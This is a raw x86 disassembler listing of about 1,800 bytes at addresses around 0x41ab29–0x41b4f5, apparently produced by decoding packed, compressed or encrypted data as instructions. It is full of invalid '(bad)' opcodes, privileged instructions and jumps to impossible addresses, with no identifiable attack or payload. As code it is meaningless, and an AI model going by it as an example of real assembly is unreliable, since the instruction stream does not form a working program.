  41ab29:	sbb    ch,BYTE PTR ds:0x67fa16d0
  41ab2f:	mov    cl,0xd5
  41ab31:	push   esp
  41ab32:	pushf  
  41ab33:	pop    edi
  41ab34:	mov    ebp,0xc24bf77
  41ab39:	mov    edx,0x8d1d88ff
  41ab3e:	rol    DWORD PTR [ecx-0x1e0f3bb6],cl
  41ab44:	cmp    DWORD PTR [ebx+eax*4+0x76f81f7d],ebp
  41ab4b:	(bad)  
  41ab4c:	cmp    ch,cl
  41ab4e:	pusha  
  41ab4f:	mov    dl,0xe5
  41ab51:	test   eax,0xf67767c5
  41ab56:	jbe    0x41ab16
  41ab58:	stos   BYTE PTR es:[edi],al
  41ab59:	xchg   ebx,edi
  41ab5b:	sbb    BYTE PTR [edx+ecx*1],bh
  41ab5e:	pop    ds
  41ab5f:	ins    DWORD PTR es:[edi],dx
  41ab60:	adc    ecx,ebp
  41ab62:	xchg   BYTE PTR [ebx+esi*2-0x5e],ch
  41ab66:	push   ss
  41ab67:	mov    ds,WORD PTR [esi-0x629ad38]
  41ab6d:	jg     0x41abe3
  41ab6f:	sbb    al,BYTE PTR [esi+0x3b]
  41ab72:	fstp   TBYTE PTR [eax+esi*8-0x15]
  41ab76:	rcr    esp,1
  41ab78:	lds    esp,FWORD PTR [eax+0x15725ad]
  41ab7e:	jne    0x41abcf
  41ab80:	xor    eax,DWORD PTR [edx]
  41ab82:	sti    
  41ab83:	adc    DWORD PTR [eax+0x79a1f66d],esp
  41ab89:	pusha  
  41ab8a:	pusha  
  41ab8b:	rol    esi,0xf7
  41ab8e:	push   esi
  41ab8f:	mov    ds:0x1b9ef56d,eax
  41ab94:	mov    ebp,esi
  41ab96:	sbb    edx,edi
  41ab98:	arpl   WORD PTR [esi-0x2],ax
  41ab9b:	sub    al,0xf0
  41ab9d:	cmp    DWORD PTR [edi],esp
  41ab9f:	out    0x5b,al
  41aba1:	test   al,0xdc
  41aba3:	jmp    0xeb19:0xf4242ba6
  41abaa:	sbb    BYTE PTR [esi-0x55],0x21
  41abae:	add    DWORD PTR [eax-0x5a],ecx
  41abb1:	pop    ebp
  41abb2:	outs   dx,BYTE PTR ds:[esi]
  41abb3:	arpl   WORD PTR [edi+edi*4-0x62],di
  41abb7:	mov    esp,0x1fc5794f
  41abbc:	ins    BYTE PTR es:[edi],dx
  41abbd:	icebp  
  41abbe:	mov    bl,0xe2
  41abc0:	ror    BYTE PTR [ecx+0xb],1
  41abc3:	inc    esp
  41abc4:	call   0x1087:0xb9cd4bad
  41abcb:	(bad)  
  41abcd:	das    
  41abce:	and    eax,0x4914ba4f
  41abd3:	push   ds
  41abd4:	inc    esp
  41abd5:	cld    
  41abd6:	sub    esi,DWORD PTR [ecx-0x28]
  41abd9:	stc    
  41abda:	in     eax,0xe0
  41abdc:	mov    ebp,0xdc4060ee
  41abe1:	(bad)  
  41abe2:	jle    0x41ac41
  41abe4:	and    eax,0xc1925584
  41abe9:	and    esi,DWORD PTR [edx-0x2d733be2]
  41abef:	jb     0x41aba9
  41abf1:	or     ah,dh
  41abf3:	jne    0x41ac05
  41abf5:	mov    cl,0xf0
  41abf7:	cmp    eax,0xcb0f07e7
  41abfc:	stc    
  41abfd:	repnz hlt 
  41abff:	jmp    0x35a39a04
  41ac04:	lahf   
  41ac05:	adc    eax,0x9a4f0002
  41ac0a:	aas    
  41ac0b:	je     0x41abf7
  41ac0d:	pushf  
  41ac0e:	shl    eax,cl
  41ac10:	repz add BYTE PTR [eax],al
	...
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ebx+esi*8-0x19]
  41ac82:	cmp    bl,BYTE PTR [edx+0x11c49]
  41ac88:	add    eax,0xa7000001
  41ac8d:	cli    
  41ac8e:	cmp    al,0x8e
  41ac90:	xchg   edi,eax
  41ac91:	push   ebx
  41ac92:	inc    esi
  41ac93:	jmp    0x7965749f
  41ac98:	mov    eax,ds:0x37c615db
  41ac9d:	push   ecx
  41ac9e:	pop    ss
  41ac9f:	xor    al,0xd8
  41aca1:	cmp    ecx,edx
  41aca3:	(bad)  
  41aca4:	adc    BYTE PTR [edx+0x4ed37bdb],bh
  41acaa:	jns    0x41acca
  41acac:	sbb    dh,ch
  41acae:	arpl   si,ax
  41acb0:	out    dx,eax
  41acb1:	lock outs dx,BYTE PTR ds:[esi]
  41acb3:	mov    ebp,0xfc8235be
  41acb8:	(bad)  
  41acb9:	out    0x2f,eax
  41acbb:	(bad)  
  41acbc:	or     eax,0x4d2a78c8
  41acc1:	dec    ebp
  41acc2:	loopne 0x41ad0b
  41acc4:	ins    DWORD PTR es:[edi],dx
  41acc5:	sub    al,0x7a
  41acc7:	xor    eax,ecx
  41acc9:	xor    dh,bh
  41accb:	mov    ebp,0xd2e79670
  41acd0:	scas   eax,DWORD PTR es:[edi]
  41acd1:	lahf   
  41acd2:	xchg   ecx,eax
  41acd3:	(bad)  
  41acd4:	jne    0x41acf1
  41acd6:	cmp    al,0xe5
  41acd8:	dec    esp
  41acd9:	dec    ebx
  41acda:	cmp    ebp,DWORD PTR [esi+0x44]
  41acdd:	mov    al,cl
  41acdf:	inc    esi
  41ace0:	sahf   
  41ace1:	retf   0x16ac
  41ace4:	cmovbe edi,DWORD PTR [esp+ebx*1+0x41]
  41ace9:	jnp    0x41acee
  41aceb:	push   edi
  41acec:	stc    
  41aced:	or     DWORD PTR [eax-0x12],0x1b
  41acf1:	gs pop edi
  41acf3:	dec    esi
  41acf4:	and    ecx,0x764fc494
  41acfa:	and    al,0x0
  41acfc:	ret    
  41acfd:	inc    ebx
  41acfe:	pop    edi
  41acff:	lods   eax,DWORD PTR ds:[esi]
  41ad00:	leave  
  41ad01:	jo     0x41acb8
  41ad03:	cmp    DWORD PTR [edx+edi*1-0x7b],esi
  41ad07:	add    BYTE PTR [esi+0x79],cl
  41ad0a:	push   cs
  41ad0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad0c:	imul   ebp,DWORD PTR [edx],0xf048dd92
  41ad12:	mov    cl,BYTE PTR [esi+0x6627bb72]
  41ad18:	ds out dx,eax
  41ad1a:	push   ecx
  41ad1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1c:	fst    DWORD PTR [ebx-0x4844dd8f]
  41ad22:	and    eax,0xb77f6151
  41ad27:	xor    ah,al
  41ad29:	mov    edx,0xcb8d1bab
  41ad2e:	inc    edx
  41ad2f:	in     eax,0x7f
  41ad31:	xchg   esi,eax
  41ad32:	adc    DWORD PTR [edx-0x24],0xffffff9c
  41ad36:	icebp  
  41ad37:	push   0x15d91d3d
  41ad3c:	retf   0xedba
  41ad3f:	push   cs
  41ad40:	push   0xffffff8b
  41ad42:	hlt    
  41ad43:	xchg   ebp,eax
  41ad44:	push   ds
  41ad45:	loopne 0x41ad0d
  41ad47:	push   ss
  41ad48:	sub    DWORD PTR [esi-0x5f649db7],esp
  41ad4e:	xchg   DWORD PTR [eax-0x19],ecx
  41ad51:	push   ebp
  41ad52:	xor    al,0x96
  41ad54:	ins    DWORD PTR es:[edi],dx
  41ad55:	and    al,0xf9
  41ad57:	sahf   
  41ad58:	add    eax,0x63de7b82
  41ad5d:	stos   DWORD PTR es:[edi],eax
  41ad5e:	cmp    dh,BYTE PTR [eax]
  41ad60:	ret    0x8182
  41ad63:	pop    esi
  41ad64:	fwait
  41ad65:	adc    eax,0xf6be131a
  41ad6a:	lods   eax,DWORD PTR ds:[esi]
  41ad6b:	lahf   
  41ad6c:	sub    DWORD PTR [eax],esi
  41ad6e:	pop    ss
  41ad6f:	outs   dx,DWORD PTR ds:[esi]
  41ad70:	shl    BYTE PTR [esi],cl
  41ad72:	add    BYTE PTR [edx-0x22],cl
  41ad75:	test   DWORD PTR [edi-0x1b],ebx
  41ad78:	jae    0x41ad95
  41ad7a:	addr16 pusha 
  41ad7c:	mov    ch,0x91
  41ad7e:	cs (bad) 
  41ad80:	ins    DWORD PTR es:[edi],dx
  41ad81:	jp     0x41adac
  41ad83:	mov    ebx,0x2795f16f
  41ad88:	xchg   BYTE PTR [ebp-0x5a],al
  41ad8b:	out    0x8d,al
  41ad8d:	jnp    0x41adac
  41ad8f:	push   edx
  41ad90:	mov    ecx,0x0
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edx+eiz*4+0x4e496be8],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	jne    0x41ae22
  41ae0e:	out    0xd9,al
  41ae10:	fs mov dl,0xcf
  41ae13:	adc    eax,0x9a591da8
  41ae18:	ror    ebx,0x44
  41ae1b:	mov    ch,0xc2
  41ae1d:	retf   0x6b58
  41ae20:	hlt    
  41ae21:	(bad)  
  41ae22:	inc    eax
  41ae23:	lahf   
  41ae24:	or     BYTE PTR [esi-0x6a9bd601],bh
  41ae2a:	jle    0x41ae37
  41ae2c:	mov    gs,WORD PTR [edx]
  41ae2e:	jns    0x41ade8
  41ae30:	xor    DWORD PTR [ecx-0x2b],0x46
  41ae34:	mov    BYTE PTR [eax-0x20e2ad06],cl
  41ae3a:	outs   dx,DWORD PTR ds:[esi]
  41ae3b:	push   eax
  41ae3c:	push   0x34ec71ac
  41ae41:	out    dx,eax
  41ae42:	int    0xf
  41ae44:	(bad)  
  41ae45:	push   0x17
  41ae47:	xor    edi,esi
  41ae49:	les    eax,FWORD PTR [ebp+ebx*2+0x4d]
  41ae4d:	xchg   esp,eax
  41ae4e:	call   0xfa721277
  41ae53:	dec    esi
  41ae54:	add    DWORD PTR [edx],esp
  41ae56:	es jb  0x41aeb1
  41ae59:	ds shl esp,1
  41ae5c:	cmp    ah,BYTE PTR [edi]
  41ae5e:	and    al,0xc7
  41ae60:	lea    edi,[ebx-0x7f]
  41ae63:	push   cs
  41ae64:	fs shl bh,0x49
  41ae68:	pop    esp
  41ae69:	mov    edi,DWORD PTR [ebp-0x1d]
  41ae6c:	sub    esi,DWORD PTR [ecx-0x687034e7]
  41ae72:	lods   eax,DWORD PTR ds:[esi]
  41ae73:	aaa    
  41ae74:	outs   dx,BYTE PTR ds:[esi]
  41ae75:	mov    cs,WORD PTR [ebp+0x75]
  41ae78:	ss cwde 
  41ae7a:	lods   al,BYTE PTR ds:[esi]
  41ae7b:	and    ah,bl
  41ae7d:	jmp    0xb92b:0xefa536f8
  41ae84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae85:	xlat   BYTE PTR ds:[ebx]
  41ae86:	pop    es
  41ae87:	retf   0xabe0
  41ae8a:	or     BYTE PTR [ebx+0xf],cl
  41ae8d:	mov    WORD PTR [ebx],?
  41ae8f:	and    BYTE PTR [edx+0xf422a1c],dl
  41ae95:	cwde   
  41ae96:	xor    ecx,DWORD PTR [edi+0x4a]
  41ae99:	stc    
  41ae9a:	xchg   esi,eax
  41ae9b:	ret    
  41ae9c:	xor    esp,ecx
  41ae9e:	mov    dl,0xe4
  41aea0:	jne    0x41ae4e
  41aea2:	pusha  
  41aea3:	cmp    ecx,0xfffffff7
  41aea6:	mov    ecx,DWORD PTR [ecx-0x59b28faf]
  41aeac:	sbb    DWORD PTR [esi-0x38384a9c],0x203b7bbf
  41aeb6:	xchg   esi,eax
  41aeb7:	push   0x72
  41aeb9:	and    dh,ch
  41aebb:	xor    al,0x4d
  41aebd:	test   al,0x3
  41aebf:	invd   
  41aec1:	lock jns 0x41af08
  41aec4:	push   edi
  41aec5:	hlt    
  41aec6:	xchg   ebx,eax
  41aec7:	in     eax,0xb5
  41aec9:	xchg   BYTE PTR [esi+0x4889ebd4],cl
  41aecf:	icebp  
  41aed0:	inc    ebp
  41aed1:	cwde   
  41aed2:	les    ebp,FWORD PTR [edi+0x3d]
  41aed5:	xchg   cl,ah
  41aed7:	fs stos DWORD PTR es:[edi],eax
  41aed9:	loopne 0x41ae81
  41aedb:	call   0x54d01198
  41aee0:	xor    dh,BYTE PTR [si+0x4415]
  41aee5:	xchg   ebp,eax
  41aee6:	in     al,0x3a
  41aee8:	and    ch,BYTE PTR [ebx-0x48]
  41aeeb:	jmp    FWORD PTR [edx+eiz*1+0x0]
  41aeef:	sub    al,0xf9
  41aef1:	cmp    DWORD PTR ds:0x8489e5ae,eax
  41aef7:	lods   eax,DWORD PTR ds:[esi]
  41aef8:	xor    al,0xa
  41aefa:	cld    
  41aefb:	fldcw  WORD PTR [edi+0x30]
  41aefe:	xor    eax,0xcc0be755
  41af03:	mov    ds:0xcc0c0b44,eax
  41af08:	ins    BYTE PTR es:[edi],dx
  41af09:	mov    ch,0x4f
  41af0b:	hlt    
  41af0c:	or     al,0x26
  41af0e:	shl    BYTE PTR [eax+0x22],1
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xa3f044ee
  41af82:	jmp    0x41af28
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x35000001
  41af8d:	bound  ebp,QWORD PTR [ebp+0x32]
  41af90:	out    dx,al
  41af91:	cmp    esi,DWORD PTR [ecx+0x333d7801]
  41af97:	stc    
  41af98:	dec    esp
  41af99:	xor    eax,0x9a24959d
  41af9e:	mov    dh,BYTE PTR [edx]
  41afa0:	pusha  
  41afa1:	aaa    
  41afa2:	jl     0x41afa1
  41afa4:	mov    ds:0x41edbda6,eax
  41afa9:	sub    eax,0x1ec4a855
  41afae:	(bad)  
  41afaf:	push   esi
  41afb0:	jbe    0x41af37
  41afb2:	cmp    edx,DWORD PTR [ebx]
  41afb4:	ins    BYTE PTR es:[edi],dx
  41afb5:	sbb    BYTE PTR [ebx+0x77],0x54
  41afb9:	outs   dx,DWORD PTR ds:[esi]
  41afba:	push   es
  41afbb:	pop    ds
  41afbc:	mov    BYTE PTR [ecx],cl
  41afbe:	scas   eax,DWORD PTR es:[edi]
  41afbf:	call   FWORD PTR [edi]
  41afc1:	push   cs
  41afc2:	enter  0xf14c,0xf6
  41afc6:	fcmove st,st(7)
  41afc8:	or     al,0x48
  41afca:	ror    DWORD PTR [eax],cl
  41afcc:	cmp    ch,0x98
  41afcf:	pop    ebx
  41afd0:	mov    ebx,0xfe5ec007
  41afd5:	push   edi
  41afd6:	je     0x41afb3
  41afd8:	xor    DWORD PTR [ebx+0x797a458],esi
  41afde:	adc    bh,BYTE PTR [esi]
  41afe0:	fsubr  QWORD PTR [ecx]
  41afe2:	add    eax,0x60125c16
  41afe7:	sub    eax,esi
  41afe9:	les    eax,FWORD PTR [ecx-0x3cf63d59]
  41afef:	dec    edi
  41aff0:	aam    0x32
  41aff2:	pop    ds
  41aff3:	mov    ds:0xeba1a6db,eax
  41aff8:	sbb    edi,ebp
  41affa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41affb:	sahf   
  41affc:	in     eax,0xd5
  41affe:	push   edi
  41afff:	sbb    DWORD PTR es:[eax-0x35],0x63494794
  41b007:	js     0x41af90
  41b009:	add    dl,dh
  41b00b:	adc    BYTE PTR [ebx],dh
  41b00d:	dec    ebx
  41b00e:	inc    edi
  41b00f:	aaa    
  41b010:	lahf   
  41b011:	jge    0x41b070
  41b013:	sub    DWORD PTR [ebp-0xf79539e],edi
  41b019:	stos   DWORD PTR es:[edi],eax
  41b01a:	aaa    
  41b01b:	nop
  41b01c:	rol    BYTE PTR [ecx+0xbc0faea],0x36
  41b023:	push   edx
  41b024:	add    DWORD PTR [ebx+0x70],eax
  41b027:	out    0x37,eax
  41b029:	cs push cs
  41b02b:	mov    bl,0xa5
  41b02d:	aad    0x3c
  41b02f:	cld    
  41b030:	pop    edi
  41b031:	pusha  
  41b032:	call   0xdbe8:0x53d807e
  41b039:	mov    fs,WORD PTR [eax]
  41b03b:	imul   esi,ebx,0xffffffd9
  41b03e:	icebp  
  41b03f:	adc    BYTE PTR es:[edi],al
  41b042:	cli    
  41b043:	inc    ebp
  41b044:	jmp    FWORD PTR [eax]
  41b046:	mov    dh,0xcb
  41b048:	xchg   BYTE PTR [ebx+0xf],cl
  41b04b:	icebp  
  41b04c:	popf   
  41b04d:	or     al,0x8f
  41b04f:	xchg   BYTE PTR [eax-0x11],ah
  41b052:	clc    
  41b053:	outs   dx,DWORD PTR ds:[esi]
  41b054:	inc    ecx
  41b055:	not    BYTE PTR [esp+ebx*1]
  41b058:	mov    edi,0xd958007c
  41b05d:	repnz or al,0xc3
  41b060:	cdq    
  41b061:	or     DWORD PTR [eax],0x34c4390b
  41b067:	in     eax,dx
  41b068:	test   BYTE PTR [eax],cl
  41b06a:	test   BYTE PTR [esp+esi*4+0x8cd3710],dl
  41b071:	push   ecx
  41b072:	pop    ss
  41b073:	inc    ecx
  41b074:	inc    esi
  41b075:	or     DWORD PTR [edi],ebx
  41b077:	jno    0x41b095
  41b079:	fisttp DWORD PTR [edi-0x75774868]
  41b07f:	or     BYTE PTR [eax],dh
  41b081:	cmp    edx,DWORD PTR ss:[edi-0x30]
  41b085:	xchg   BYTE PTR [ecx-0x1a4ed8b2],dl
  41b08b:	or     DWORD PTR [ecx+0x13b75a2d],edi
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x6e4f9878
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x3000001
  41b10d:	fidiv  DWORD PTR [ebx]
  41b10f:	add    esi,DWORD PTR ds:0x55f53e0f
  41b115:	sub    eax,0xf764df
  41b11a:	rol    DWORD PTR [ebx+0xc],cl
  41b11d:	cmp    edx,DWORD PTR gs:[ebx]
  41b120:	out    0x3,al
  41b122:	add    ah,BYTE PTR [ecx-0x1868c457]
  41b128:	xchg   edx,eax
  41b129:	inc    esi
  41b12a:	imul   edi,DWORD PTR [ecx],0x27
  41b12d:	fwait
  41b12e:	int3   
  41b12f:	and    cl,BYTE PTR [eax-0x385b09d9]
  41b135:	or     bl,bl
  41b137:	out    0x36,al
  41b139:	call   0xdee1:0xcb46e2e2
  41b140:	push   ebp
  41b141:	ror    esp,cl
  41b143:	sub    dl,al
  41b145:	pop    esi
  41b146:	(bad)  
  41b147:	jmp    0x41b1b8
  41b149:	xor    BYTE PTR [esi],ch
  41b14b:	dec    edx
  41b14c:	mov    edi,0x737f422a
  41b151:	aaa    
  41b152:	cmc    
  41b153:	stos   DWORD PTR es:[edi],eax
  41b154:	pop    esi
  41b155:	mov    bl,0xac
  41b157:	ss rcl al,cl
  41b15a:	mov    bh,0xe
  41b15c:	aaa    
  41b15d:	je     0x41b167
  41b15f:	fist   WORD PTR [ecx]
  41b161:	mov    esi,edi
  41b163:	pop    ebx
  41b164:	mov    eax,0x9b07b1ee
  41b169:	pop    ss
  41b16a:	aaa    
  41b16b:	mov    bl,0xad
  41b16d:	fs xor eax,edi
  41b170:	dec    esp
  41b171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b172:	adc    eax,0x20e188fc
  41b177:	add    esp,DWORD PTR [ebx]
  41b179:	rcl    DWORD PTR [edx+0x3b2e4fc2],cl
  41b17f:	cmc    
  41b180:	(bad)  [eax+0x116d1333]
  41b186:	adc    BYTE PTR [eax-0x5],bl
  41b189:	lea    esp,ds:0x9d091797
  41b18f:	or     eax,0xcbff0677
  41b194:	jno    0x41b1fb
  41b196:	xor    BYTE PTR [ebp+0x4a37aa1d],bl
  41b19c:	mov    ah,0xe1
  41b19e:	xchg   esi,eax
  41b19f:	lea    eax,[edx+0x2879f577]
  41b1a5:	and    ebx,DWORD PTR [eax+0x4fcc155c]
  41b1ab:	jmp    0x5d9e2e7a
  41b1b0:	push   ds
  41b1b1:	push   ss
  41b1b2:	test   eax,0x2d98d447
  41b1b7:	dec    edi
  41b1b8:	sub    BYTE PTR [eax+0xf1338d7],0xbb
  41b1bf:	aaa    
  41b1c0:	cmp    BYTE PTR [eax-0x2c65c93b],bh
  41b1c6:	adc    BYTE PTR [ebp-0x6fa3b61f],bl
  41b1cc:	ror    bh,1
  41b1ce:	(bad)  
  41b1cf:	enter  0xd444,0xf0
  41b1d3:	mov    edx,esi
  41b1d5:	daa    
  41b1d6:	in     eax,dx
  41b1d7:	and    DWORD PTR ds:0xfaac67bb,esp
  41b1dd:	fisttp QWORD PTR [eax+0x5b6ed29c]
  41b1e3:	sub    dh,ah
  41b1e5:	rcl    BYTE PTR [eax],cl
  41b1e7:	xor    bl,BYTE PTR [edx-0x31]
  41b1ea:	leave  
  41b1eb:	push   0xe5691d9b
  41b1f0:	mov    edi,0xfeaeb8f7
  41b1f5:	shl    BYTE PTR fs:[eax],cl
  41b1f8:	mov    bl,BYTE PTR [esi]
  41b1fa:	mov    bl,0xaf
  41b1fc:	dec    ebp
  41b1fd:	mov    ds:0x150f5f08,al
  41b202:	lahf   
  41b203:	pop    esi
  41b204:	mov    ecx,0x8e968ec
  41b209:	icebp  
  41b20a:	dec    ebx
  41b20b:	fsubr  QWORD PTR ds:0xa9ee3db6
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx],ch
  41b281:	sbb    al,0x1a
  41b283:	xor    bl,BYTE PTR [ebp+0x20]
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    eax,0xb9000001
  41b28d:	jae    0x41b225
  41b28f:	mov    ss,WORD PTR [ebx]
  41b291:	jl     0x41b310
  41b293:	adc    cl,0x32
  41b296:	icebp  
  41b297:	or     al,0x9e
  41b299:	pop    es
  41b29a:	cmc    
  41b29b:	jge    0x41b266
  41b29d:	xor    al,0x5
  41b29f:	inc    esi
  41b2a0:	add    DWORD PTR [edi-0x581b3fba],esp
  41b2a6:	fisub  DWORD PTR [ecx]
  41b2a8:	jmp    0xd38d:0x1bbf7c03
  41b2af:	add    al,0x59
  41b2b1:	sti    
  41b2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2b3:	jb     0x41b295
  41b2b5:	adc    BYTE PTR [ebx+0xbf201a0],bh
  41b2bb:	rcl    DWORD PTR [esi-0x440a04d7],1
  41b2c1:	lods   eax,DWORD PTR ds:[esi]
  41b2c2:	push   es
  41b2c3:	dec    ebp
  41b2c4:	sti    
  41b2c5:	frstor [esi]
  41b2c7:	add    BYTE PTR [esi-0x30b104da],cl
  41b2cd:	test   eax,0xb65fe6de
  41b2d2:	cwde   
  41b2d3:	ja     0x41b27e
  41b2d5:	int3   
  41b2d6:	rcl    DWORD PTR [ecx-0x16],0x7d
  41b2da:	mov    esp,edi
  41b2dc:	rol    bh,1
  41b2de:	repz icebp 
  41b2e0:	and    eax,DWORD PTR [ebx+ecx*4-0x3b24bfcd]
  41b2e7:	sbb    al,0x20
  41b2e9:	outs   dx,BYTE PTR ds:[esi]
  41b2ea:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b2ec:	sbb    dl,BYTE PTR [ecx+0x664e71c3]
  41b2f2:	in     al,dx
  41b2f3:	rcr    DWORD PTR fs:[bp+di-0x4f],1
  41b2f8:	rcl    DWORD PTR [ecx-0x44],0x7b
  41b2fc:	ret    0x5706
  41b2ff:	inc    esp
  41b300:	add    BYTE PTR [eax],dl
  41b302:	mov    eax,0xd0488e58
  41b307:	add    al,0xb1
  41b309:	jnp    0x41b2c6
  41b30b:	pop    edi
  41b30c:	sbb    dl,bh
  41b30e:	call   0xa857:0xdf7a84a5
  41b315:	sti    
  41b316:	xor    dl,bh
  41b318:	popa   
  41b319:	loopne 0x41b2bf
  41b31b:	cmp    al,0xea
  41b31d:	fs test eax,0xf43bdfdf
  41b323:	adc    ebp,edi
  41b325:	bnd jle 0x41b2e9
  41b328:	mov    eax,DWORD PTR [ecx-0x43]
  41b32b:	inc    ebp
  41b32c:	ret    0xb2a4
  41b32f:	add    BYTE PTR [eax+0x23],dl
  41b332:	sbb    al,BYTE PTR [edi]
  41b334:	call   0x3656:0xf99d2453
  41b33b:	pushf  
  41b33c:	mov    esp,0xb2f6fee9
  41b341:	adc    esi,DWORD PTR [ecx+eiz*8]
  41b344:	sbb    al,0x24
  41b346:	jg     0x41b368
  41b348:	and    DWORD PTR [edi],ebx
  41b34a:	iret   
  41b34b:	and    esp,esp
  41b34d:	daa    
  41b34e:	dec    ecx
  41b34f:	je     0x41b34e
  41b351:	ins    BYTE PTR es:[edi],dx
  41b352:	mov    al,BYTE PTR [ebx-0x17114fde]
  41b358:	jmp    0x41b365
  41b35a:	xchg   ecx,esp
  41b35c:	cli    
  41b35d:	mov    esp,0x4c6d1783
  41b362:	add    eax,0xcc442937
  41b367:	pop    esi
  41b368:	test   ebp,0x4df0fa06
  41b36e:	mov    BYTE PTR [eax+ecx*2],cl
  41b371:	inc    ebx
  41b372:	mov    ch,0x82
  41b374:	mov    esi,0xb5123de4
  41b379:	jb     0x41b30a
  41b37b:	xor    BYTE PTR [ecx],0x85
  41b37e:	jp     0x41b30f
  41b380:	inc    ecx
  41b381:	push   ss
  41b382:	scas   eax,DWORD PTR es:[edi]
  41b383:	jno    0x41b3ca
  41b385:	push   0xfcc662c5
  41b38a:	imul   ecx,DWORD PTR [ecx+0x76],0x7a
  41b38e:	aad    0xe7
  41b390:	inc    edx
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	call   0x121:0x627a3776
  41b407:	add    BYTE PTR ds:0xd4000001,al
  41b40d:	retf   
  41b40e:	rcl    BYTE PTR [eax-0x26],0x83
  41b412:	fucom  st(2)
  41b414:	ins    DWORD PTR es:[edi],dx
  41b415:	fcmovbe st,st(2)
  41b417:	rcl    DWORD PTR [eax+0x7759855d],0x73
  41b41e:	paddb  mm4,mm7
  41b421:	cmc    
  41b422:	jmp    0x699a:0x38f0985d
  41b429:	repz ffree st(7)
  41b42c:	fistp  QWORD PTR [ecx+0x50d5855a]
  41b432:	je     0x41b3c7
  41b434:	shl    DWORD PTR [edi+ebp*2+0x468b06f3],cl
  41b43b:	push   es
  41b43c:	(bad)  
  41b43d:	and    al,0x3c
  41b43f:	(bad)  
  41b440:	imul   ecx,esi,0xffffffac
  41b443:	pusha  
  41b444:	and    eax,0x38ff84fd
  41b449:	xor    dl,al
  41b44b:	push   eax
  41b44c:	mov    al,0xba
  41b44e:	mov    esi,0xdc86549d
  41b453:	sti    
  41b454:	mov    eax,0x22ffe33a
  41b459:	pop    ebp
  41b45a:	loop   0x41b3f4
  41b45c:	pop    ecx
  41b45d:	jmp    0xce38:0x180cecf2
  41b464:	outs   dx,BYTE PTR ds:[esi]
  41b465:	je     0x41b401
  41b467:	test   al,0x7d
  41b469:	sub    DWORD PTR [edx-0x749ddec7],0x60
  41b470:	dec    ebx
  41b471:	stos   BYTE PTR es:[edi],al
  41b472:	push   eax
  41b473:	fs ss jle 0x41b456
  41b477:	(bad)  
  41b478:	jno    0x41b4d0
  41b47a:	ins    DWORD PTR es:[edi],dx
  41b47b:	ret    
  41b47c:	retf   0xd6d9
  41b47f:	xchg   edi,eax
  41b480:	mov    BYTE PTR [ebx+edx*2+0xa],bl
  41b484:	lock imul esp,DWORD PTR [edx+0x2c],0x20d78fdc
  41b48c:	jmp    DWORD PTR [eax]
  41b48e:	test   BYTE PTR [edi-0x1f6fd717],dh
  41b494:	mov    eax,0x73203c49
  41b499:	dec    edx
  41b49a:	retf   
  41b49b:	out    dx,eax
  41b49c:	(bad)  [eax+0x76]
  41b49f:	and    ebp,ecx
  41b4a1:	pop    bp
  41b4a3:	cmp    eax,0xe1f775ca
  41b4a8:	std    
  41b4a9:	mov    BYTE PTR ds:0x687a99e9,al
  41b4af:	(bad)  
  41b4b1:	nop    DWORD PTR [ecx+0x528320ac]
  41b4b8:	mov    al,ds:0xca4b26e9
  41b4bd:	push   0x78f937d9
  41b4c2:	mov    dh,BYTE PTR [ecx]
  41b4c4:	push   edx
  41b4c5:	mov    ecx,0xd33e0c65
  41b4ca:	add    bl,ch
  41b4cc:	out    dx,eax
  41b4cd:	sub    dl,BYTE PTR [ebx+0x24]
  41b4d0:	sbb    dl,BYTE PTR [esi+0x26]
  41b4d3:	and    al,0xe
  41b4d5:	ja     0x41b4de
  41b4d7:	int3   
  41b4d8:	js     0x41b510
  41b4da:	inc    edi
  41b4db:	dec    ebp
  41b4dc:	sbb    DWORD PTR [ebp+edi*4+0x7a],edi
  41b4e0:	sub    ebp,eax
  41b4e2:	not    BYTE PTR [edi-0x7709df42]
  41b4e8:	outs   dx,BYTE PTR ds:[esi]
  41b4e9:	shl    DWORD PTR [edx],cl
  41b4eb:	je     0x41b471
  41b4ed:	inc    edx
  41b4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ef:	mov    dl,0x74
  41b4f1:	sub    al,0x11
  41b4f3:	fmul   st(1),st
  41b4f5:	retf   
